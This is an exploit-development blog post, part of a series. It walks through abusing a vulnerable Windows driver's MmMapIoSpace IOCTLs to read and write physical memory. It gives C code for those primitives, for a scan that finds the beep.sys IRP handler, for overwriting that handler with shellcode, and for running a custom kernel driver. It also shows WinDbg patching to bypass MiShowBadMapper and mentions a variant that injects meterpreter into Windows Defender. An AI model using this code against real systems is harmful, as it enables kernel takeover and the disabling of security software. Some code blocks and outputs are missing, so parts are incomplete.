description: In this installment of the kernel driver exploitation series, we’ll explore a widely used yet vulnerable memory mapping function in the Windows kernel known as MmMapIoSpace. 
---

## Introduction

To continue our journey in exploiting vulnerable drivers we will investigate one of the more common kernel NT functions responsible for memory corruptions, namely `MmMapIoSpace`. As per Microsoft [documentation](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmmapiospace) the function takes a physical (RAM) address as argument and returns the base virtual address that maps the base physical address for the range. So basically we can map physical addresses into virtual user space, which is pretty neat. Unfortunately from a kernel exploit developers perspective this function is primarily used for interacting with hardware, where the physical addresses are well-defined and memory-mapped device registers or reserved regions of physical memory are allocated by the operating system.

Due to the fact `MmMapIoSpace` operates directly on physical memory reliable exploitation to get arbitrary read and write primitives is particularly challenging. Modern OSes like Windows handle memory management using paging, where virtual addresses are mapped to physical addresses via page tables, making the physical memory layout invisible to user-mode. To abuse **MmMapIoSpace**, you need the exact physical address of the virtual memory region to map, translating virtual addresses to physical ones is difficult due to OS restrictions and the inability to map page tables. 
Additionally, physical memory is often fragmented and dynamically managed, further complicating direct access. These challenges make working with `MmMapIoSpace` a rather non-trivial task.

## Exploitation with WinDbg

Since we need to work directly with physical memory, we must determine how to translate physical addresses into the virtual address space to interact with them effectively. The challenge lies in the fact that, under normal circumstances, developers rarely deal with physical memory directly, as this is entirely managed by the operating system. The OS abstracts the physical memory layout, handles paging, and provides virtual memory mappings, making physical addresses largely irrelevant for typical development tasks.

However, if we aim to hijack execution in kernel mode, we need a way to locate and manipulate specific regions of physical memory in a different way. This requires bypassing the operating system's abstractions to identify where kernel data structures or function pointers reside in physical memory. Without direct access to page tables for virtual-to-physical translation (restricted by modern Windows implementations), we must rely on alternative techniques, such as scanning physical memory for known patterns to locate our target memory regions. Only then can we map, modify, or overwrite these areas to achieve our desired level of control in kernel mode.

Another issue arises from changes introduced in Windows 10 version 1803, which specifically prevent mapping page tables and certain other sensitive memory regions using `MmMapIoSpace`. This presents itself particularly frustrating when kernel debugging where a simple physical memory read operation can unexpectedly cause the system to bugcheck. This behavior is one of the quirks associated with exploiting `MmMapIoSpace` and is linked to the `MiShowBadMapper` mechanism. 

In Windows 10, bypassing this restriction can be done by modifying a single byte (changing its value from 0 to 2). However, in Windows 11, the process is more complex and requires some additional effort.

For Windows 10 the necessary steps in WinDbg are as follows:

``` windbg
0: kd> u MiShowBadMapper L20
nt!MiShowBadMapper:
fffff801`0a141ac4 48895c2410 mov qword ptr [rsp+10h],rbx
fffff801`0a141ac9 48896c2418 mov qword ptr [rsp+18h],rbp
fffff801`0a141ace 4889742420 mov qword ptr [rsp+20h],rsi
fffff801`0a141ad3 57 push rdi
fffff801`0a141ad4 4881ec90000000 sub rsp,90h
fffff801`0a141adb 488b050e511600 mov rax,qword ptr [nt!_security_cookie (fffff801`0a2a6bf0)]
fffff801`0a141ae2 4833c4 xor rax,rsp
fffff801`0a141ae5 4889842480000000 mov qword ptr [rsp+80h],rax
fffff801`0a141aed 8a1de7ad1900 mov bl,byte ptr [nt!MiState+0x1eda (fffff801`0a2dc8da)]
0: kd> eb fffff801`0a2dc8da 2
```

To patch the check in Windows 11 following commands can be used:

```
0: kd> u MiShowBadMapper L30

```

To verify our driver is vulnerable we need to show that we can read and write arbitrary memory regions from user-space. For a simple proof of concept we will use a kernel debugger (WinDbg) and Filetest. Translating virtual to physical addresses in WinDbg is rather straight-forward, as we can extract the necessary information directly in the debugger. 
The `CR3` register (Control Register 3) serves a key role in memory management. It stores the physical address of the page directory base in memory, which is an essential part of the paging mechanism. The page directory base is used during the translation of virtual addresses into their corresponding physical addresses, making the `CR3` register an integral component of the virtual memory management system.

The following example demonstrates how writable kernel memory can be translated into a physical address for use in memory-related operations. As part of our proof of concept, we utilize the well-known `KUserSharedData` structure. This choice is deliberate because it is a reliable and predictable target, as it is almost certain that data can be written into its offset at `+0x800`. The `KUserSharedData` structure is typically located at the virtual memory address `0xfffff78000000000`, making it a consistent and accessible location for this kind of operation. The screenshot included here provides a detailed illustration of how the translation process is carried out in practice.

{{< figure src="/images/x501.png" class="center" >}}

The next step is to utilize our arbitrary read and write primitives to determine whether it is possible to modify kernel memory directly from user space. This approach allows us to test if unauthorized manipulation of kernel-level data can be achieved.

The driver employs IOCTL code `0x8000649c` to perform the mapping of physical memory to virtual address space using `MmMapIoSpace`.
The Ghidra disassembly of the vulnerable write function is provided below:

{{< figure src="/images/x502.png" class="center" >}}

Similarly, memory can be read using the IOCTL code `0x80006498`. This IOCTL is utilized by the driver to perform memory read operations, allowing access to specific regions of memory.

{{< figure src="/images/x503.png" class="center" >}}

To interact with kernel memory, we use our trusted `filetest` tool to experiment with writable regions. Recall that `KUserSharedData` is located at the physical address `0xf7e2d800`.
In the next screenshot, we demonstrate writing a test payload, specifically the value `0x4141424243434444`, into `KUserSharedData` at offset `+0x800`. This operation confirms whether user space processes can successfully modify this memory region.

{{< figure src="/images/x504.png" class="center" >}}

Using WinDbg, we can confirm that the data has been successfully written to the targeted memory location. The debugger output verifies that the test payload has been correctly placed in the `KUserSharedData` structure at the specified offset.

{{< figure src="/images/x505.png" class="center" >}}

The same outcome can be achieved directly from user space by utilizing the IOCTL code `0x80006498`. This demonstrates that the memory write operation can be performed from user land, providing the expected results without requiring kernel-level access.

{{< figure src="/images/x506.png" class="center" >}}

## Exploit Development

In both scenarios, we can modify or read 8 bytes of memory at a time. The following C code provides an example of how these read and write operations can be implemented:

```C
DWORD64 readPhysMem8bPrimitive(HANDLE driver, DWORD64 physicalAddress) {

	DWORD lpBytesReturned;
	char iBuf[8];
	char oBuf[8];

	memcpy(&iBuf[0], &physicalAddress, 0x8);

	// calling kernel function MmMapioSpace to map physical address into user space
	BOOL status = DeviceIoControl(
		driver,
		IOCTL_CODE_READ_4B,
		iBuf,
		0x8,
		oBuf,
		0x8,
		&lpBytesReturned,
		NULL
	);

	return (DWORD64)(*(DWORD64*)oBuf);
}
```

```C
void writePhysMem8bPrimitive(HANDLE driver, DWORD64 physicalAddress, DWORD64 bPayload) {

	DWORD lpBytesReturned;

	char iBuf[0x10];

	memcpy(&iBuf[0], &physicalAddress, 0x8);
	memcpy(&iBuf[8], &bPayload, 0x8);

	// calling kernel function MmMapioSpace to map physical address into user space
	BOOL status = DeviceIoControl(
		driver,
		IOCTL_CODE_WRITE_8B,
		iBuf,
		0x10,
		NULL,
		0,
		&lpBytesReturned,
		NULL
	);
}
```

With these two functions, we now have the capability to exploit our driver and execute arbitrary code in kernel mode. While this approach is effective, there are limitations to consider. Since we cannot directly modify critical data structures like Page Table Entries (PTEs) or other sensitive components in ring 0, we need an alternative method. 

Fortunately, after some effort and research, I came across an excellent blog post by *stong* on [CVE-2020-15368](https://github.com/stong/CVE-2020-15368). In this post, he demonstrates how to overwrite the Beep IRP handler with shellcode mapped from a custom driver. This technique aligns perfectly with our needs, so we will follow the same approach. 

As an additional note, there was a recent research publication by *Cedrik Van Bockhaven* from Outflank titled ["Mapping Virtual to Physical Addresses Using Superfetch"](https://www.outflank.nl/blog/2023/12/14/mapping-virtual-to-physical-adresses-using-superfetch/), which explores bypassing restrictions with `MmMapIoSpace`. However, since my research predates this (conducted in 2022 but not yet published), I have not incorporated those findings into this approach.

The beep functionality on a PC is managed by a kernel driver `beep.sys`, which is loaded by default on all Windows systems. Drawing from techniques used in game hacking, we locate the signature in memory where the driver invokes its IRP Handler, overwrite this address with our custom shellcode, and then trigger the exploit by using `beep.sys's` IOCTL code.  This method effectively repurposes the Beep driver to execute our payload, providing a reliable path for kernel-mode code execution.

Below is the signature we need to locate in memory, and in the WinDbg output we can examine the bytes at the start of the beep IRP handler:  

```C++
DWORD64 beepSignature1 = 0x8b4c20ec83485340;
DWORD64 beepSignature2 = 0xd28b4c000000b882;
```

{{< figure src="/images/x507.png" class="center" >}}

Here’s the function to accomplish this in C:

```C++
BOOL findBeepIOHandler(IN HANDLE driver, OUT DWORD64* pBeepHandler) {

	PRINTA("[i] interacting with driver to scan for beep signature\n");
	DWORD64 start = 0x000001290;
	DWORD64 end = 0x2fffff290;

	for (DWORD64 index = start; index <= end; index += 0x1000) {
		//PRINTA("[+] check index 0x%x\n", index);
		DWORD64 byteSequence = readPhysMem8bPrimitive(driver, index);
		// check bytes at physical memory
		if (byteSequence) {
			//PRINTA("[+] check bytes for beep %x\n", byteSequence);
			DWORD64 beepSignature1 = 0x8b4c20ec83485340;
			DWORD64 beepSignature2 = 0xd28b4c000000b882;
			if (byteSequence == beepSignature1) {
				// success signature[8] found, check next 8 bytes for confirmation
				byteSequence = readPhysMem8bPrimitive(driver, (index + 0x8));
				if (byteSequence == beepSignature2) {
					// save
					*pBeepHandler = index;
					PRINTA("[+] beep IOCTL handler at 0x%x\n", pBeepHandler);
					return TRUE;
				}
			}
		}
	}
	PRINTA("Beep IOCTL Handler not found, exiting\n");
	return FALSE;
}
```

Once we have successfully located the IRP Handler, the next step is to write our shellcode (which essentially consists of our custom driver) to that specific memory address. After placing the shellcode, we can trigger the Beep IOCTL to initiate the exploitation. The driver code itself is relatively simple: it allocates memory, copies the shellcode into this allocated region, and then starts a new thread to execute arbitrary code.

What makes this method so powerful is that, once the thread is up and running, we gain the ability to execute virtually any code in kernel memory. This provides us with immense flexibility and control over what can be executed next. It's an incredibly elegant solution, and the credit goes to *stong* for the brilliant idea. Neat!

```C++
// Driver.c
__int64 __declspec(dllexport) __fastcall ShellCodeIrpHandler(struct _DEVICE_OBJECT* a1, IRP* irp) {

	ULONG ioctl_no = irp->Tail.Overlay.CurrentStackLocation->Parameters.DeviceIoControl.IoControlCode;
	BeepIRPStruct* pBeepStructData = (BeepIRPStruct*)irp->AssociatedIrp.SystemBuffer;

	PVOID pRwxData = pBeepStructData->nt_ExAllocatePoolWithTag(NonPagedPoolExecute, pBeepStructData->szPayloadSize, 'hoho');
	//__debugbreak();
	pBeepStructData->nt_memcpy(pRwxData, pBeepStructData->bPayload, pBeepStructData->szPayloadSize);

	// start thread
	HANDLE hThread;
	PVOID pStartAddr = (void*)((uintptr_t)pRwxData + 0x1000);
	pBeepStructData->nt_PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, (PKSTART_ROUTINE)pStartAddr, NULL);

	((void (*)(PIRP, CCHAR))pBeepStructData->nt_IofCompleteRequest)(irp, 0);

	return 0;
}

__int64 __declspec(dllexport) ShellCodeIrpHandler_end;

// ----------------------------------------------------------------
// run some attack
BOOL runTestPayload() {
	DBG_LOG("[+] Greetings From Kernel Land! \n");
	return TRUE;
}
// ----------------------------------------------------------------


DRIVER_INITIALIZE DriverEntry;
_Use_decl_annotations_
	NTSTATUS
	DriverEntry(
		struct _DRIVER_OBJECT* DriverObject,
		PUNICODE_STRING  RegistryPath
	) {

	DBG_LOG("[+] Driver Loaded Successfully \n");


	if (!runTestPayload()) {
		DBG_LOG("Executing Attack Payload Failed \n");
		return -1;
	}


	DbgPrint("[*] DONE!\n");

	return STATUS_SUCCESS;
}

```

What is left to do in our exploit is to resolve some function pointers. Although Stong’s code also includes handling for relocations, this part was not required for my specific scenario. The reason for this is that all the code we need is contained within the `.text` section, meaning that there are no global variables or other external references that would necessitate handling relocations. This greatly simplifies the process, as it avoids the need for additional complexity related mind boggling relocations. Instead, we resolve the function pointers to ensure the correct execution flow and copy all the necessary addresses and the payload (i.e. the actual driver PE file's .text section) to a struct which we will finally pass to the beep IRP handler. 

```C++
// DriverIRP.h
typedef struct BeepIRPStruct {
	void* g_NtosKrnl;
	void (*nt_memcpy)(PVOID dst, PVOID src, SIZE_T len);
	void* (*nt_ExAllocatePoolWithTag)(ULONG PoolType, SIZE_T NumberOfBytes, ULONG Tag);
	NTSTATUS(*nt_PsCreateSystemThread)(PHANDLE ThreadHandle, ULONG DesiredAccess, void* ObjectAttributes, HANDLE ProcessHandle, void* ClientId, void* StartRoutine, PVOID StartContext);
	void* nt_IofCompleteRequest;
	SIZE_T szPayloadSize;
	BYTE bPayload[];
} BeepIRPStruct, pBeepIRPStruct;
```


```C++
BOOL CopyFunctionPointers() {

	PRINTA("[+] ------------------------------------------------------\n");
	PRINTA("[i] Calculating and Copying Function Pointers \n");

	DWORD64 dwNtosKrnlBase = g_NtosKrnl;
	
	if (!dwNtosKrnlBase)
	{
		PRINTA("Can't find address of ntoskrnl.exe\n");
		return -1;
	}

	PRINTA("[i] Kernel Base located at %p\n", dwNtosKrnlBase);


	// load ntoskrnl.exe library to retrieve function pointers for shellcode
	HMODULE hNtoskrnl = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!hNtoskrnl)
	{
		PRINTA("[!] Failed to map Ntoskrnl Dll");
		return -1;
	}

	PRINTA("[i] Ntoskrnl.exe Dll located at 0x%p\n", hNtoskrnl);

	g_BeepIRPShellcodeData->g_NtosKrnl = (void*)dwNtosKrnlBase;

	PVOID memcpy = (PVOID)GetProcAddress(hNtoskrnl, "memcpy");
	PRINTA("\t[V] --> GetProcAddress memcpy at %p\n", memcpy);
	g_BeepIRPShellcodeData->nt_memcpy = (PVOID)(dwNtosKrnlBase + (DWORD64)memcpy - (DWORD64)hNtoskrnl);
	PRINTA("\t[V] --> nt!memcpy at %p\n", g_BeepIRPShellcodeData->nt_memcpy);

	PRINTA("[+] Processing Function Pointers Success! \n");
	PRINTA("[+] ------------------------------------------------------\n");

	return TRUE;

}
```

The output of the code is shown below:

We also need to update the IAT of the PE file to execute the position independent code once we call the kernel thread. The following code illustrates how this process is carried out in practice. First we map the custom driver including the IRP handler into memory, resolve all the sections and imports and finally retrieve all the function pointers required for our exploit code.

The following shows the resolving of function pointers and the updated IAT after the modifications:

At offset +0x4000 is the updated IAT with the populated function pointers from above:

Once we have everything set up correctly we call the beep handler:

```C++
VOID triggerBeepIO(HANDLE driver) {

	char out_buf[4000]; // doesnt really matter
	DWORD bytes_returned;
	PRINTA("[i] Sending Payload With Size 0x%x to Beep\n", g_szShellcodeDataSize);

	//hexdump(BeepIRPShellcodeData, my_shellcode_data_sz);
	BOOL result = DeviceIoControl(driver, 0x1234, g_BeepIRPShellcodeData, g_szShellcodeDataSize, out_buf, sizeof(out_buf), &bytes_returned, NULL);

	if (!result) {
		PRINTA("[!] Beep DeviceIOControl error %s\n", GetLastError());
	}

	PRINTA("[i] trigger DeviceIoControl Beep returns %d\n", result);
}
```

And our shellcode will execute:

The full code including two attacks can be found on Github. The first attack variant solely executes a print statement in kernel mode to verify everything is working as expected. A second attack that I shamelessly stole from maldev academy is to enumerate all processes and inject a meterpreter shellcode into the Windows Defender process. If you ever want to mess with a vulnerable driver that can read and write memory using MmMapIoSpace it should be trivial to adapt the code as needed. All you basically need to do is to write your own read and write primitives and you are all set. happy kernel memory mapping !
